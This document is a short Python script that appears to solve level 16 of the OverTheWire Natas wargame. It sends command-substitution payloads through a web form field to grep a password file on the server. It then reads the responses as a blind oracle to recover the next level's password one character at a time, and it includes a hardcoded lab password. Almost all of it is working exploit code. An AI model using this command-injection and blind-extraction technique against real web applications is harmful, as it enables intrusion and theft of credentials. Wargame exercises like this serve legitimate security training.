#!/usr/bin/env python
import requests

possible_chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
success_ans = 'hackers'

used_chars = ''

for char in possible_chars:
    payload = {'needle': ('$(grep %c /etc/natas_webpass/natas17)hackers' % char)}
    r = requests.post('http://natas16.natas.labs.overthewire.org/index.php', auth=('natas16', password), data=payload)
    if not (success_ans in r.text):
        used_chars += char

print used_chars

cracked_pass = ''
for i in range(32):
    for char in used_chars:
        new_pass = cracked_pass + char
        payload = {'needle': ('$(grep -E ^%s.* /etc/natas_webpass/natas17)hackers' % new_pass)}
        r = requests.post('http://natas16.natas.labs.overthewire.org/index.php', auth=('natas16', password), data=payload)
        if not success_ans in r.text:
            cracked_pass += char
            print cracked_pass
            break
